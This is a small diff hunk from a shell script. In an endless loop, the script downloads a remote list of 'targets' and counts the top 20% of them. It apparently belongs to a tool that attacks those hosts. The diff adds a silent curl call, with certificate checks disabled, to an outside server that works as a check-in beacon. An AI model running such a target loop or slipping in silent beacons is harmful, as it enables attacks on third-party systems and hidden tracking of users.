@@ -641,6 +641,7 @@ echo '
 while true
 do
   readarray -t list < <(curl https://raw.githubusercontent.com/dmitryshagin/targets/main/list)
+  curl -kfsSL https://orda.dshagin.pro/ping
   targets_count=${#list[@]}
   top_20_count=$(( targets_count*20/100 ))
 
